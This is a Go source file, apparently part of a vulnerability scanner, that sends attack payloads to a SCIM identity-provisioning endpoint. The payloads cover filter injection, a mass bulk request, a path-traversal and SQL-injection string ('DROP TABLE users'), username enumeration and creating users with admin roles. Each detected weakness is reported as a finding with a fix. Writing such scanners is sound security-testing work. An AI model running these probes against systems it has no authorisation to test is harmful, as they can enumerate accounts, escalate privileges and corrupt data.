package scim

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"github.com/CodeMonkeyCybersecurity/shells/internal/httpclient"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
	"github.com/google/uuid"
)

// Attacker handles SCIM attack implementations
type Attacker struct {
	client *http.Client
	config *SCIMConfig
}

// NewAttacker creates a new SCIM attacker
func NewAttacker(client *http.Client, config *SCIMConfig) *Attacker {
	return &Attacker{
		client: client,
		config: config,
	}
}

// TestFilterInjection tests for SCIM filter injection vulnerabilities
func (a *Attacker) TestFilterInjection(ctx context.Context, endpoint *SCIMEndpoint) []types.Finding {
	findings := []types.Finding{}

	// Filter injection payloads
	payloads := []FilterPayload{
		{
			Name:        "OR Injection",
			Filter:      `userName eq "admin" or 1 eq 1`,
			Expected:    "Bypass filters to enumerate all users",
			Impact:      "Attackers can bypass filtering to access unauthorized data",
			Severity:    "HIGH",
			Description: "Tests if logical OR operators can be used to bypass filters",
		},
		{
			Name:        "AND Injection",
			Filter:      `userName eq "admin" and 1 eq 1`,
			Expected:    "Modify filter logic",
			Impact:      "Attackers can modify filter conditions",
			Severity:    "MEDIUM",
			Description: "Tests if logical AND operators can be manipulated",
		},
		{
			Name:        "Parentheses Injection",
			Filter:      `userName eq "admin" or (1 eq 1)`,
			Expected:    "Bypass filters using parentheses",
			Impact:      "Attackers can use parentheses to manipulate filter logic",
			Severity:    "HIGH",
			Description: "Tests if parentheses can be used to alter filter precedence",
		},
		{
			Name:        "Substring Injection",
			Filter:      `userName sw "adm" or userName sw ""`,
			Expected:    "Enumerate users with substring matching",
			Impact:      "Attackers can enumerate users using substring operations",
			Severity:    "MEDIUM",
			Description: "Tests if substring operations can be exploited",
		},
		{
			Name:        "Regex Injection",
			Filter:      `userName pr and userName co ".*"`,
			Expected:    "Use regex to match all users",
			Impact:      "Attackers can use regex patterns to enumerate data",
			Severity:    "MEDIUM",
			Description: "Tests if regex-like patterns can be injected",
		},
		{
			Name:        "Attribute Injection",
			Filter:      `userName eq "admin" or password pr`,
			Expected:    "Access password attribute",
			Impact:      "Attackers can access sensitive attributes",
			Severity:    "CRITICAL",
			Description: "Tests if sensitive attributes can be accessed through filters",
		},
		{
			Name:        "Null Bypass",
			Filter:      `userName eq null or userName ne null`,
			Expected:    "Bypass null checks",
			Impact:      "Attackers can bypass null value validations",
			Severity:    "MEDIUM",
			Description: "Tests if null values can be used to bypass filters",
		},
		{
			Name:        "Escaping Test",
			Filter:      `userName eq "admin\"" or "1"="1`,
			Expected:    "Escape quotes to inject SQL-like syntax",
			Impact:      "Attackers can escape quotes to inject malicious syntax",
			Severity:    "HIGH",
			Description: "Tests if quote escaping can be exploited",
		},
	}

	for _, payload := range payloads {
		finding := a.testFilterPayload(ctx, endpoint, payload)
		if finding != nil {
			findings = append(findings, *finding)
		}
	}

	return findings
}

// testFilterPayload tests a specific filter injection payload
func (a *Attacker) testFilterPayload(ctx context.Context, endpoint *SCIMEndpoint, payload FilterPayload) *types.Finding {
	// Build URL with filter parameter
	baseURL := endpoint.URL + "/Users"
	filterURL := fmt.Sprintf("%s?filter=%s", baseURL, url.QueryEscape(payload.Filter))

	// Create request
	req, err := http.NewRequestWithContext(ctx, "GET", filterURL, nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", a.config.UserAgent)
	req.Header.Set("Accept", "application/scim+json, application/json")

	// Add authentication if available
	a.addAuthentication(req)

	// Send request
	resp, err := a.client.Do(req)
	if err != nil {
		return nil
	}
	defer httpclient.CloseBody(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	// Analyze response for injection indicators
	if a.isFilterInjectionVulnerable(resp, body, payload) {
		return &types.Finding{
			ID:          uuid.New().String(),
			Tool:        "scim",
			Type:        VulnSCIMFilterInjection,
			Severity:    a.getSeverityFromString(payload.Severity),
			Title:       fmt.Sprintf("SCIM Filter Injection - %s", payload.Name),
			Description: fmt.Sprintf("SCIM filter injection vulnerability detected: %s", payload.Description),
			Evidence:    fmt.Sprintf("Filter: %s\nResponse Code: %d\nResponse Length: %d", payload.Filter, resp.StatusCode, len(body)),
			Solution:    "Implement proper input validation and sanitization for SCIM filters",
			References:  []string{"https://tools.ietf.org/html/rfc7644#section-3.4.2.2"},
			Metadata: map[string]interface{}{
				"endpoint":      endpoint.URL,
				"filter":        payload.Filter,
				"payload_name":  payload.Name,
				"status_code":   resp.StatusCode,
				"response_size": len(body),
				"impact":        payload.Impact,
			},
			CreatedAt: time.Now(),
		}
	}

	return nil
}

// isFilterInjectionVulnerable checks if the response indicates filter injection vulnerability
func (a *Attacker) isFilterInjectionVulnerable(resp *http.Response, body []byte, payload FilterPayload) bool {
	// Check for successful response with potential injection
	if resp.StatusCode == http.StatusOK {
		var data map[string]interface{}
		if err := json.Unmarshal(body, &data); err == nil {
			// Check if totalResults is unexpectedly high (indicating OR injection worked)
			if totalResults, ok := data["totalResults"].(float64); ok {
				if totalResults > 100 { // Arbitrary threshold
					return true
				}
			}

			// Check for specific injection indicators
			if strings.Contains(payload.Filter, "or 1 eq 1") {
				if totalResults, ok := data["totalResults"].(float64); ok && totalResults > 0 {
					return true
				}
			}
		}
	}

	// Check for error responses that might indicate injection
	if resp.StatusCode >= 400 && resp.StatusCode < 500 {
		bodyStr := string(body)
		errorIndicators := []string{
			"syntax error",
			"invalid filter",
			"filter parse error",
			"unexpected token",
			"malformed filter",
		}

		for _, indicator := range errorIndicators {
			if strings.Contains(strings.ToLower(bodyStr), indicator) {
				return true
			}
		}
	}

	return false
}

// TestBulkOperations tests for bulk operation abuse
func (a *Attacker) TestBulkOperations(ctx context.Context, endpoint *SCIMEndpoint) []types.Finding {
	findings := []types.Finding{}

	// Test bulk operation limit bypass
	if finding := a.testBulkLimitBypass(ctx, endpoint); finding != nil {
		findings = append(findings, *finding)
	}

	// Test bulk operation injection
	if finding := a.testBulkInjection(ctx, endpoint); finding != nil {
		findings = append(findings, *finding)
	}

	return findings
}

// testBulkLimitBypass tests for bulk operation limit bypass
func (a *Attacker) testBulkLimitBypass(ctx context.Context, endpoint *SCIMEndpoint) *types.Finding {
	// Create a bulk request with excessive operations
	operations := []BulkOperation{}
	for i := 0; i < 1000; i++ { // Excessive number of operations
		operations = append(operations, BulkOperation{
			Method: "POST",
			BulkID: fmt.Sprintf("bulk-%d", i),
			Path:   "/Users",
			Data: map[string]interface{}{
				"schemas":  []string{SchemaUser},
				"userName": fmt.Sprintf("testuser%d", i),
				"name": map[string]interface{}{
					"givenName":  "Test",
					"familyName": "User",
				},
				"emails": []map[string]interface{}{
					{
						"value":   fmt.Sprintf("testuser%d@example.com", i),
						"primary": true,
					},
				},
			},
		})
	}

	bulkRequest := BulkRequest{
		FailOnErrors: 1,
		Operations:   operations,
	}

	// Send bulk request
	jsonData, err := json.Marshal(bulkRequest)
	if err != nil {
		return nil
	}

	req, err := http.NewRequestWithContext(ctx, "POST", endpoint.URL+"/Bulk", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", a.config.UserAgent)
	req.Header.Set("Content-Type", "application/scim+json")
	req.Header.Set("Accept", "application/scim+json")

	a.addAuthentication(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil
	}
	defer httpclient.CloseBody(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	// Check if bulk operation was accepted despite excessive operations
	if resp.StatusCode == http.StatusOK {
		return &types.Finding{
			ID:          uuid.New().String(),
			Tool:        "scim",
			Type:        VulnSCIMBulkAbuse,
			Severity:    types.SeverityHigh,
			Title:       "SCIM Bulk Operation Limit Bypass",
			Description: "SCIM endpoint accepts excessive bulk operations without proper limits",
			Evidence:    fmt.Sprintf("Bulk request with %d operations returned status %d", len(operations), resp.StatusCode),
			Solution:    "Implement proper limits on bulk operations",
			References:  []string{"https://tools.ietf.org/html/rfc7644#section-3.7"},
			Metadata: map[string]interface{}{
				"endpoint":         endpoint.URL,
				"operations_count": len(operations),
				"status_code":      resp.StatusCode,
				"response_size":    len(body),
			},
			CreatedAt: time.Now(),
		}
	}

	return nil
}

// testBulkInjection tests for bulk operation injection
func (a *Attacker) testBulkInjection(ctx context.Context, endpoint *SCIMEndpoint) *types.Finding {
	// Create bulk request with injection payloads
	operations := []BulkOperation{
		{
			Method: "POST",
			BulkID: "injection-test",
			Path:   "/Users/../Groups", // Path traversal attempt
			Data: map[string]interface{}{
				"schemas":  []string{SchemaUser},
				"userName": "admin'; DROP TABLE users; --",
				"name": map[string]interface{}{
					"givenName":  "Injection",
					"familyName": "Test",
				},
			},
		},
	}

	bulkRequest := BulkRequest{
		FailOnErrors: 1,
		Operations:   operations,
	}

	jsonData, err := json.Marshal(bulkRequest)
	if err != nil {
		return nil
	}

	req, err := http.NewRequestWithContext(ctx, "POST", endpoint.URL+"/Bulk", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", a.config.UserAgent)
	req.Header.Set("Content-Type", "application/scim+json")
	req.Header.Set("Accept", "application/scim+json")

	a.addAuthentication(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil
	}
	defer httpclient.CloseBody(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)

	// Check for injection indicators
	injectionIndicators := []string{
		"syntax error",
		"invalid path",
		"path traversal",
		"unexpected character",
		"malformed request",
	}

	for _, indicator := range injectionIndicators {
		if strings.Contains(strings.ToLower(bodyStr), indicator) {
			return &types.Finding{
				ID:          uuid.New().String(),
				Tool:        "scim",
				Type:        VulnSCIMBulkAbuse,
				Severity:    types.SeverityHigh,
				Title:       "SCIM Bulk Operation Injection",
				Description: "SCIM bulk operations are vulnerable to injection attacks",
				Evidence:    fmt.Sprintf("Bulk injection payload triggered response: %s", bodyStr),
				Solution:    "Implement proper input validation for bulk operations",
				References:  []string{"https://tools.ietf.org/html/rfc7644#section-3.7"},
				Metadata: map[string]interface{}{
					"endpoint":      endpoint.URL,
					"status_code":   resp.StatusCode,
					"response_size": len(body),
					"indicator":     indicator,
				},
				CreatedAt: time.Now(),
			}
		}
	}

	return nil
}

// TestUserEnumeration tests for user enumeration vulnerabilities
func (a *Attacker) TestUserEnumeration(ctx context.Context, endpoint *SCIMEndpoint) []types.Finding {
	findings := []types.Finding{}

	// Test timing-based user enumeration
	if finding := a.testTimingBasedEnumeration(ctx, endpoint); finding != nil {
		findings = append(findings, *finding)
	}

	// Test response-based user enumeration
	if finding := a.testResponseBasedEnumeration(ctx, endpoint); finding != nil {
		findings = append(findings, *finding)
	}

	return findings
}

// testTimingBasedEnumeration tests for timing-based user enumeration
func (a *Attacker) testTimingBasedEnumeration(ctx context.Context, endpoint *SCIMEndpoint) *types.Finding {
	// Test with valid and invalid usernames
	testUsers := []string{
		"admin",
		"administrator",
		"root",
		"user",
		"test",
		"nonexistentuser12345",
		"invaliduser98765",
	}

	timings := map[string]time.Duration{}

	for _, username := range testUsers {
		start := time.Now()

		filterURL := fmt.Sprintf("%s/Users?filter=%s", endpoint.URL, url.QueryEscape(fmt.Sprintf(`userName eq "%s"`, username)))

		req, err := http.NewRequestWithContext(ctx, "GET", filterURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", a.config.UserAgent)
		req.Header.Set("Accept", "application/scim+json")

		a.addAuthentication(req)

		resp, err := a.client.Do(req)
		if err != nil {
			continue
		}
		httpclient.CloseBody(resp)

		elapsed := time.Since(start)
		timings[username] = elapsed
	}

	// Analyze timing differences
	if len(timings) > 2 {
		var maxTiming, minTiming time.Duration
		for _, timing := range timings {
			if maxTiming == 0 || timing > maxTiming {
				maxTiming = timing
			}
			if minTiming == 0 || timing < minTiming {
				minTiming = timing
			}
		}

		// If there's a significant timing difference, it might indicate enumeration
		if maxTiming > minTiming*2 {
			return &types.Finding{
				ID:          uuid.New().String(),
				Tool:        "scim",
				Type:        VulnSCIMUserEnumeration,
				Severity:    types.SeverityMedium,
				Title:       "SCIM Timing-Based User Enumeration",
				Description: "SCIM endpoint response times vary significantly for different usernames",
				Evidence:    fmt.Sprintf("Max timing: %v, Min timing: %v, Ratio: %.2f", maxTiming, minTiming, float64(maxTiming)/float64(minTiming)),
				Solution:    "Implement consistent response times for all user queries",
				References:  []string{"https://tools.ietf.org/html/rfc7644#section-3.4.2.2"},
				Metadata: map[string]interface{}{
					"endpoint":   endpoint.URL,
					"max_timing": maxTiming.String(),
					"min_timing": minTiming.String(),
					"timings":    timings,
				},
				CreatedAt: time.Now(),
			}
		}
	}

	return nil
}

// testResponseBasedEnumeration tests for response-based user enumeration
func (a *Attacker) testResponseBasedEnumeration(ctx context.Context, endpoint *SCIMEndpoint) *types.Finding {
	// Test with likely valid and invalid usernames
	testCases := []struct {
		username string
		likely   bool
	}{
		{"admin", true},
		{"administrator", true},
		{"root", true},
		{"nonexistentuser12345", false},
		{"invaliduser98765", false},
	}

	responses := map[string]int{}

	for _, testCase := range testCases {
		filterURL := fmt.Sprintf("%s/Users?filter=%s", endpoint.URL, url.QueryEscape(fmt.Sprintf(`userName eq "%s"`, testCase.username)))

		req, err := http.NewRequestWithContext(ctx, "GET", filterURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", a.config.UserAgent)
		req.Header.Set("Accept", "application/scim+json")

		a.addAuthentication(req)

		resp, err := a.client.Do(req)
		if err != nil {
			continue
		}
		httpclient.CloseBody(resp)

		responses[testCase.username] = resp.StatusCode
	}

	// Check for different response codes
	codes := make(map[int][]string)
	for username, code := range responses {
		codes[code] = append(codes[code], username)
	}

	// If we have different response codes, it might indicate enumeration
	if len(codes) > 1 {
		return &types.Finding{
			ID:          uuid.New().String(),
			Tool:        "scim",
			Type:        VulnSCIMUserEnumeration,
			Severity:    types.SeverityMedium,
			Title:       "SCIM Response-Based User Enumeration",
			Description: "SCIM endpoint returns different response codes for different usernames",
			Evidence:    fmt.Sprintf("Different response codes detected: %v", codes),
			Solution:    "Return consistent response codes for all user queries",
			References:  []string{"https://tools.ietf.org/html/rfc7644#section-3.4.2.2"},
			Metadata: map[string]interface{}{
				"endpoint":  endpoint.URL,
				"responses": responses,
				"codes":     codes,
			},
			CreatedAt: time.Now(),
		}
	}

	return nil
}

// TestProvisioningAbuse tests for provisioning abuse
func (a *Attacker) TestProvisioningAbuse(ctx context.Context, endpoint *SCIMEndpoint) []types.Finding {
	findings := []types.Finding{}

	// Test privilege escalation through provisioning
	if finding := a.testProvisioningPrivilegeEscalation(ctx, endpoint); finding != nil {
		findings = append(findings, *finding)
	}

	return findings
}

// testProvisioningPrivilegeEscalation tests for privilege escalation through provisioning
func (a *Attacker) testProvisioningPrivilegeEscalation(ctx context.Context, endpoint *SCIMEndpoint) *types.Finding {
	// Try to create a user with administrative privileges
	userData := map[string]interface{}{
		"schemas":  []string{SchemaUser},
		"userName": "testprivesc",
		"name": map[string]interface{}{
			"givenName":  "Test",
			"familyName": "PrivEsc",
		},
		"emails": []map[string]interface{}{
			{
				"value":   "testprivesc@example.com",
				"primary": true,
			},
		},
		// Try to inject privileged attributes
		"roles": []map[string]interface{}{
			{
				"value": "admin",
				"type":  "primary",
			},
		},
		"groups": []map[string]interface{}{
			{
				"value": "administrators",
				"type":  "direct",
			},
		},
		"active": true,
		"admin":  true,
	}

	jsonData, err := json.Marshal(userData)
	if err != nil {
		return nil
	}

	req, err := http.NewRequestWithContext(ctx, "POST", endpoint.URL+"/Users", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", a.config.UserAgent)
	req.Header.Set("Content-Type", "application/scim+json")
	req.Header.Set("Accept", "application/scim+json")

	a.addAuthentication(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil
	}
	defer httpclient.CloseBody(resp)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	// Check if user was created with privileged attributes
	if resp.StatusCode == http.StatusCreated {
		var createdUser map[string]interface{}
		if err := json.Unmarshal(body, &createdUser); err == nil {
			// Check for privileged attributes in response
			privilegedAttrs := []string{"roles", "groups", "admin"}
			for _, attr := range privilegedAttrs {
				if _, exists := createdUser[attr]; exists {
					return &types.Finding{
						ID:          uuid.New().String(),
						Tool:        "scim",
						Type:        VulnSCIMPrivilegeEscalation,
						Severity:    types.SeverityCritical,
						Title:       "SCIM Privilege Escalation via Provisioning",
						Description: "SCIM endpoint allows creation of users with privileged attributes",
						Evidence:    fmt.Sprintf("User created with privileged attribute: %s", attr),
						Solution:    "Implement proper authorization checks for user provisioning",
						References:  []string{"https://tools.ietf.org/html/rfc7644#section-3.3"},
						Metadata: map[string]interface{}{
							"endpoint":        endpoint.URL,
							"status_code":     resp.StatusCode,
							"privileged_attr": attr,
							"created_user_id": createdUser["id"],
						},
						CreatedAt: time.Now(),
					}
				}
			}
		}
	}

	return nil
}

// addAuthentication adds authentication to the request
func (a *Attacker) addAuthentication(req *http.Request) {
	if a.config.AuthToken != "" {
		switch strings.ToLower(a.config.AuthType) {
		case "bearer", "":
			req.Header.Set("Authorization", "Bearer "+a.config.AuthToken)
		case "basic":
			req.Header.Set("Authorization", "Basic "+a.config.AuthToken)
		}
	} else if a.config.Username != "" && a.config.Password != "" {
		req.SetBasicAuth(a.config.Username, a.config.Password)
	}
}

// getSeverityFromString converts string severity to types.Severity
func (a *Attacker) getSeverityFromString(severity string) types.Severity {
	switch strings.ToUpper(severity) {
	case "CRITICAL":
		return types.SeverityCritical
	case "HIGH":
		return types.SeverityHigh
	case "MEDIUM":
		return types.SeverityMedium
	case "LOW":
		return types.SeverityLow
	default:
		return types.SeverityInfo
	}
}
